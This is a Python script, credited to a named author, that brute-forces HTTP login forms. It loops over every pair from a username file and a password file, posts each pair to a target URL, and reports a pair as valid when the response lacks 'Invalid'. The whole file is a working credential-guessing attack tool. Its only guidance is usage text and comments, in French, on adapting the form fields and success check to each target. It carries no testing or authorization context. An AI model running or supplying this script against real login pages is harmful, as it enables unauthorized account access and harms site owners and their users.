#!/usr/bin/env python3

"""
Simple HTTP login bruteforce script
Author: Theo BESSE
Usage: python3 http_bruteforce.py http://target/login.php users.txt passwords.txt
"""

import requests
import sys

def usage():
    print(f"Usage: python3 {sys.argv[0]} <url> <users_file> <passwords_file>")
    sys.exit(1)

def load_file(path):
    try:
        with open(path, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] File not found: {path}")
        sys.exit(1)

def brute_force(url, users, passwords):
    session = requests.Session()

    for user in users:
        for password in passwords:
            # Données à envoyer à adapter selon la cible
            data = {
                "username": user,
                "password": password
            }

            try:
                r = session.post(url, data=data, timeout=5)
            except requests.RequestException:
                print("[!] Connection error")
                return

            # Condition de succès à adapter selon la cible
            if "Invalid" not in r.text and r.status_code == 200:
                print("\n[+] VALID CREDENTIALS FOUND")
                print(f"    Username: {user}")
                print(f"    Password: {password}")
                return

            print(f"[-] Failed: {user}:{password}")

    print("\n[!] No valid credentials found")

def main():
    if len(sys.argv) != 4:
        usage()

    url = sys.argv[1]
    users_file = sys.argv[2]
    passwords_file = sys.argv[3]

    users = load_file(users_file)
    passwords = load_file(passwords_file)

    print("[*] Starting HTTP login bruteforce")
    print(f"[*] Target: {url}")
    print(f"[*] Users loaded: {len(users)}")
    print(f"[*] Passwords loaded: {len(passwords)}\n")

    brute_force(url, users, passwords)

if __name__ == "__main__":
    main()
